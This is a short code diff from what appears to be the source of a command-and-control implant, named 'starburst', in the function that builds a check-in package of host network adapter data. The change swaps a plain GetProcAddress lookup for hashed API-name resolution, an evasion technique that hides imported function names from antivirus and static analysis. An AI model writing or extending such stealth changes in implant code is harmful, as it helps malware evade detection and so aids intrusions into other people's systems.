@@ -59,8 +59,8 @@ auto declfn starburst::build_checkin_package(
 
         if ( h_iphlpapi ) {
             auto pGetAdaptersInfo = reinterpret_cast<fn_CI_GetAdaptersInfo>(
-                inst.kernel32.GetProcAddress( h_iphlpapi,
-                    symbol<LPCSTR>( "GetAdaptersInfo" ) ) );
+                resolve::_api( reinterpret_cast<uintptr_t>( h_iphlpapi ),
+                    expr::hash_string( "GetAdaptersInfo" ) ) );
 
             if ( pGetAdaptersInfo ) {
                 ULONG buf_size = 0;
